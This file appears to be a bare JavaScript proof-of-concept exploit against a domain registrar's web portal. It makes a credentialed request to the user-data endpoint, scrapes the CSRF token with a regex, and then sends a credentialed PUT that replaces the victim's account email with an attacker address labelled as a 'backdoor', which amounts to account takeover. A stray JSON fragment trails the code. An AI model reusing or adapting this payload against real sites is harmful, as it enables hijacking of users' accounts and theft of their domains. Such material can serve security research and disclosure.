
function submitRequest(csrf_token) {
      var xhr = new XMLHttpRequest();
      xhr.open("PUT", "https:\/\/www.united-domains.de\/pfapi\/email", true);
      xhr.setRequestHeader("Accept", "application\/json");
      xhr.setRequestHeader("Http-X-Csrf-Token", csrf_token);  
      xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
      xhr.setRequestHeader("Content-Type", "application\/json;charset=utf-8");
      xhr.withCredentials = true;
      var body = "{\"email\":\"backsddoor1ds02@tusdtanotasd.coms\",\"email_non_verified\":\"null\",\"resend\":null}";
      var aBody = new Uint8Array(body.length);
      for (var i = 0; i < aBody.length; i++)
        aBody[i] = body.charCodeAt(i); 
      xhr.send(new Blob([aBody]));
}

var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
        if (xhr.readyState == 4) {
           var htmlsource = xhr.responseText
           var regexp = new RegExp("(?:\"CSRF_TOKEN\":\")(.*?)(?:\")")
           csrf_token = htmlsource.match(regexp)[1];
           submitRequest(csrf_token);
        }
};

xhr.open('GET', 'https://www.united-domains.de/portfolio/a/user/data', true);
xhr.send();

,"email_non_verified":null,"resend":null}

